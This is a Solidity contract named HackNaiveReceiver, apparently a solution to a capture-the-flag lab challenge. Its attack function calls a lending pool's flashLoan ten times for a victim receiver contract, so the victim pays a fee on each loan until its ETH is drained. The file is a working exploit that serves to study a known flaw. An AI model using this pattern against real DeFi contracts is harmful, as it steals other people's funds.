// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

interface IFlashLoanReceiver {
    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32);
}

contract HackNaiveReceiver {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant amount = 100;

    IERC3156FlashBorrower target;
    NaiveReceiverLenderPool pool;

    constructor(address _target, address payable _pool) {
        target = IERC3156FlashBorrower(_target);
        pool = NaiveReceiverLenderPool(_pool);
    }

    receive() external payable {}

    function attack() external {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(target, ETH, amount, "0x");
        }
    }

    // function onFLashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
    //     external
    //     returns (bytes32)
    // {
    //     return keccak256("ERC3156FlashBorrower.onFlashLoan");
    // }
}
